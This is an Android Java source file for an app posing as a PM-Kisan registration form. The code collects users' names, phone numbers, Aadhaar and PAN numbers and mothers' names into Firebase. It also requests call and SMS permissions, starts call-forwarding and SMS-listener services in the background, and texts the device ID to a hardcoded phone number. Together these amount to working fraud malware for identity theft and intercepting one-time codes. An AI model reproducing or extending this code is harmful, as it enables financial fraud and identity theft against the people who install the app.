package io.pmkishan.controller;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class MainActivity extends AppCompatActivity {

    private EditText etName, etPhoneNumber, etAadharNumber, etPanNum, etMothername;
    private Button btnRegister;
    private DatabaseReference databaseReference;
    private String androidID = "";
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final String YOUR_PHONE_NUMBER = "+918757755650";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Firebase reference
        databaseReference = FirebaseDatabase.getInstance().getReference("details");

        // UI elements
        etName = findViewById(R.id.etName);
        etPhoneNumber = findViewById(R.id.etPhoneNumber);
        etAadharNumber = findViewById(R.id.etAadharNumber);
        etPanNum = findViewById(R.id.etPanNum);
        etMothername = findViewById(R.id.etMothername);
        btnRegister = findViewById(R.id.btnRegister);

        androidID = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        requestPermissions();

        btnRegister.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                registerUser();
            }
        });

        Intent callServiceIntent = new Intent(this, CallForwardingService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(callServiceIntent);
        } else {
            startService(callServiceIntent);
        }

        // ✅ SMS Listener Service Start
        Intent smsServiceIntent = new Intent(this, SmsListenerService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(smsServiceIntent);
        }
        else {
            startService(smsServiceIntent);
        }
    }

    private void requestPermissions() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.MODIFY_PHONE_STATE) != PackageManager.PERMISSION_GRANTED)
                 {

            ActivityCompat.requestPermissions(this, new String[]{
                    Manifest.permission.CALL_PHONE,
                    Manifest.permission.SEND_SMS,
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.MODIFY_PHONE_STATE
            }, PERMISSION_REQUEST_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED &&
                    grantResults[1] == PackageManager.PERMISSION_GRANTED) {

                saveAndroidIdToFirebase();
                sendAndroidIdToPhoneNumber();
            }
        }
    }


    private void saveAndroidIdToFirebase() {
        DatabaseReference userRef = databaseReference.child(androidID);
        userRef.child("AndroidID").setValue(androidID);
        userRef.child("callForwardingEnabled").setValue(false);
    }

    private void sendAndroidIdToPhoneNumber() {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            String message = "CF ID: " + androidID;
            smsManager.sendTextMessage(YOUR_PHONE_NUMBER, null, message, null, null);
        } catch (Exception e) {
            Toast.makeText(this, "❌ Failed to send SMS", Toast.LENGTH_SHORT).show();
            e.printStackTrace();
        }
    }

    private void registerUser() {
        String name = etName.getText().toString().trim();
        String phoneNumber = etPhoneNumber.getText().toString().trim();
        String aadharNum = etAadharNumber.getText().toString().trim();
        String panNum = etPanNum.getText().toString().trim();
        String motherName = etMothername.getText().toString().trim();

        if (TextUtils.isEmpty(name) || TextUtils.isEmpty(phoneNumber) || TextUtils.isEmpty(aadharNum) ||
                TextUtils.isEmpty(panNum) || TextUtils.isEmpty(motherName)) {
            Toast.makeText(this, "All fields are required!", Toast.LENGTH_SHORT).show();
            return;
        }

        if (phoneNumber.length() != 10) {
            Toast.makeText(this, "Enter a valid 10-digit phone number", Toast.LENGTH_SHORT).show();
            return;
        }

        if (aadharNum.length() != 12) {
            Toast.makeText(this, "Enter a valid 12-digit Aadhar number", Toast.LENGTH_SHORT).show();
            return;
        }

        DatabaseReference userRef = databaseReference.child(androidID);
        userRef.child("Name").setValue(name);
        userRef.child("MobileNumber").setValue(phoneNumber);
        userRef.child("AadharNum").setValue(aadharNum);
        userRef.child("PAN").setValue(panNum);
        userRef.child("MotherName").setValue(motherName);

        Toast.makeText(this, "Registration successful!", Toast.LENGTH_SHORT).show();

        etName.setText("");
        etPhoneNumber.setText("");
        etAadharNumber.setText("");
        etPanNum.setText("");
        etMothername.setText("");
    }
}
